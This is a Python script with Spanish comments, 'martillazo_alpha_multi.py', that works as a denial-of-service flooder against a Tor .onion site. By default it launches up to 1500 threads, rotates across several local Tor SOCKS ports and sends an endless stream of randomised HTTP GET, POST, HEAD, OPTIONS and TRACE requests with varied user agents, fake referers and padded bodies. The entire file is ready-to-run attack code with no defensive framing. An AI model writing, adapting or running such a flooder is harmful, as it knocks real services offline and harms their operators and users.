#!/usr/bin/env python3
# martillazo_alpha_multi.py — versión agresiva multipuerto Tor con rotación intensiva

import socks, socket, threading, random, time, argparse

parser = argparse.ArgumentParser()
parser.add_argument("onion_host", help="Dominio .onion v3")
parser.add_argument("-t", "--threads", type=int, default=1500, help="Hilos máximos")
parser.add_argument("-p", "--ports", default="9055,9056,9057,9058,9059,9060", help="Puertos Tor separados por coma")
args = parser.parse_args()

onion_host = args.onion_host
max_threads = args.threads
socks_ports = [int(p) for p in args.ports.split(",")]
port_idx = 0
active_threads = 0
lock = threading.Lock()

PORT = 80

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "curl/7.87.0", "Wget/1.21.1", "Lynx/2.8.9rel.1",
    "python-requests/2.31", "Go-http-client/1.1", "libwww-perl/6.66"
]
referers = [
    "http://duckduckgo.com", "http://protonmail.com",
    "http://facebookcorewwwi.onion", "http://torproject.org"
]
metodos = ["GET", "POST", "HEAD", "OPTIONS", "TRACE"]

def siguiente_socks():
    global port_idx
    with lock:
        port = socks_ports[port_idx % len(socks_ports)]
        port_idx += 1
    return port

def generar_payload():
    metodo = random.choice(metodos)
    ruta = f"/multi/{random.randint(10000,99999)}"
    ua = random.choice(user_agents)
    ref = random.choice(referers)
    headers = (
        f"{metodo} {ruta} HTTP/1.1\r\n"
        f"Host: {onion_host}\r\n"
        f"User-Agent: {ua}\r\n"
        f"Referer: {ref}\r\n"
        f"Accept-Encoding: gzip, deflate\r\n"
        f"X-Martillazo-Multi: {random.randint(1,999999)}\r\n"
        f"Connection: keep-alive\r\n"
    )
    if metodo == "POST":
        body = f"multi={random.randint(1,999999)}&data={'B'*random.randint(50,300)}"
        headers += f"Content-Length: {len(body)}\r\n\r\n{body}"
    else:
        headers += "\r\n"
    return headers

def martillazo(port):
    global active_threads
    try:
        s = socks.socksocket()
        s.set_proxy(socks.SOCKS5, "127.0.0.1", port)
        s.settimeout(8)
        s.connect((onion_host, PORT))
        s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, random.randint(2, 6))
        s.sendall(generar_payload().encode())
        s.close()
    except:
        pass
    with lock:
        active_threads -= 1

def lanzador():
    global active_threads
    while True:
        with lock:
            libres = max_threads - active_threads
        for _ in range(libres):
            port = siguiente_socks()
            with lock:
                active_threads += 1
            threading.Thread(target=martillazo, args=(port,), daemon=True).start()
        time.sleep(0.4)

if __name__ == "__main__":
    print(f"\n🚀 martillazo_alpha_multi.py cargando contra {onion_host}")
    print(f"🔁 Rotando entre puertos: {socks_ports} | Hilos máx: {max_threads}\n")
    lanzador()
